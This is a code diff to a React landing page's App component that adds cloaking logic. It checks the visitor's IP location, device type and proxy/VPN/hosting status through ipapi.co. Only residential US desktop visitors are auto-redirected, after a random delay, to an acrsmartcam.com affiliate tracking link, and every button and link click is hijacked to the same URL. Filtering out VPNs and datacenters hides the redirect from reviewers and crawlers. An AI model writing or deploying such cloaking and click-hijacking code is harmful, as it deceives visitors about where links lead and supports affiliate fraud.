@@ -8,72 +8,57 @@ import Testimonials from './components/Testimonials';
 import Footer from './components/Footer';
 
 const App: React.FC = () => {
-  const redirectUrl = "https://t.acrsmartcam.com/402888/8873/0?aff_sub5=SF_006OG000004lmDN";
-  const [accessStatus, setAccessStatus] = useState<'checking' | 'allowed' | 'blocked_geo' | 'blocked_device'>('checking');
+  const redirectUrl = "https://t.acrsmartcam.com/406599/8873/0?aff_sub5=SF_006OG000004lmDN";
+  const [accessStatus, setAccessStatus] = useState<'checking' | 'allowed' | 'blocked_geo' | 'blocked_device' | 'blocked_proxy'>('checking');
   const [allowRedirect, setAllowRedirect] = useState(false);
 
   useEffect(() => {
     const checkAccess = async () => {
-      // Device check: Desktop only
-      const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+      // 检测设备
+      const isDesktop = !/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
       
-      const toBool = (val: any) => {
-        if (typeof val === 'string') {
-          const s = val.toLowerCase();
-          if (s === 'no' || s === 'false') return false;
-          if (s === 'yes' || s === 'true') return true;
-        }
-        return val === true;
-      };
-
+      // 获取 IP 信息
+      let data: any;
       try {
-        const response = await fetch('https://ipwho.is/');
-        const data = await response.json();
-        console.log(data);
-        
-        const country = data.country_code || data.country;
-        const proxy = toBool(data.security?.proxy);
-        const vpn = toBool(data.security?.vpn);
-        const hosting = toBool(data.connection?.type === 'hosting' || data.connection?.type === 'datacenter' || data.security?.hosting);
-
-        if (isMobile) {
-          setAllowRedirect(false);
-          setAccessStatus('blocked_device');
-          return;
-        }
-
-        if (
-          country !== "US" ||
-          proxy === true ||
-          vpn === true ||
-          hosting === true
-        ) {
-          setAllowRedirect(false);
-          setAccessStatus('blocked_geo');
-        } else {
-          // If we reach here, it's US, Desktop, and Residential (not proxy/hosting)
-          setAllowRedirect(true);
-          setAccessStatus('allowed');
-          
-          // Auto-redirect after random delay (1500ms to 2500ms)
-          var delay = Math.floor(Math.random() * (2500 - 1500 + 1)) + 1500;
-          setTimeout(function(){
-            window.location.href = redirectUrl;
-          }, delay);
-        }
-
-      } catch (error) {
-        console.error("IP Check Error:", error);
-        // Default allow on error
-        setAllowRedirect(true);
-        setAccessStatus('allowed');
-        
-        // Auto-redirect after random delay (1500ms to 2500ms)
-        var delay = Math.floor(Math.random() * (2500 - 1500 + 1)) + 1500;
-        setTimeout(function(){
-          window.location.href = redirectUrl;
-        }, delay);
+        const res = await fetch("https://ipapi.co/json");
+        data = await res.json();
+        console.log("IP data:", data);
+      } catch(e) {
+        console.warn("IP接口异常，默认不跳转", e);
+        data = {};
       }
+
+      // 判断是否美国住宅IP
+      const isUS = data.country === "US";
+      const proxy = Boolean(data.proxy || data.hosting || data.vpn);
+
+      if (!isDesktop) {
+        setAccessStatus('blocked_device');
+        setAllowRedirect(false);
+        return;
+      }
+
+      if (!isUS) {
+        setAccessStatus('blocked_geo');
+        setAllowRedirect(false);
+        return;
+      }
+
+      if (proxy) {
+        setAccessStatus('blocked_proxy');
+        setAllowRedirect(false);
+        return;
+      }
+
+      // All checks passed
+      setAccessStatus('allowed');
+      setAllowRedirect(true);
+
+      // 延迟跳转
+      const delay = Math.floor(Math.random() * (3500 - 2000 + 1)) + 2000;
+      setTimeout(() => {
+        window.location.href = redirectUrl;
+      }, delay);
     };
 
     checkAccess();
@@ -83,11 +68,12 @@ const App: React.FC = () => {
   useEffect(() => {
     const handleGlobalClick = (e: MouseEvent) => {
       const target = e.target as HTMLElement;
-      const button = target.closest('button');
+      // 所有按钮点击直接跳转
+      const clickable = target.closest('button, .btn, .link, a');
       
-      if (button) {
-        e.preventDefault();
+      if (clickable) {
         if (allowRedirect) {
+          e.preventDefault();
           window.location.href = redirectUrl;
         }
       }
@@ -126,13 +112,18 @@ const App: React.FC = () => {
   return (
     <div className="min-h-screen bg-[#FDFCFB] overflow-x-hidden selection:bg-rose-500 selection:text-white text-[#1C1C1C]">
       {accessStatus === 'blocked_geo' && (
-        <div className="fixed top-0 left-0 w-full bg-rose-600 text-white py-4 text-center z-[200] font-bold shadow-2xl animate-slide-down">
+        <div className="fixed top-0 left-0 w-full bg-[#ff4d4d] text-white py-[10px] text-center z-[9999] font-bold shadow-2xl animate-slide-down">
           This content is available for US visitors only.
         </div>
       )}
       {accessStatus === 'blocked_device' && (
-        <div className="fixed top-0 left-0 w-full bg-rose-600 text-white py-4 text-center z-[200] font-bold shadow-2xl animate-slide-down">
+        <div className="fixed top-0 left-0 w-full bg-[#ff4d4d] text-white py-[10px] text-center z-[9999] font-bold shadow-2xl animate-slide-down">
           Desktop access required to continue.
+        </div>
+      )}
+      {accessStatus === 'blocked_proxy' && (
+        <div className="fixed top-0 left-0 w-full bg-[#ff4d4d] text-white py-[10px] text-center z-[9999] font-bold shadow-2xl animate-slide-down">
+          Residential US IP required. Proxy/VPN detected.
         </div>
       )}
       
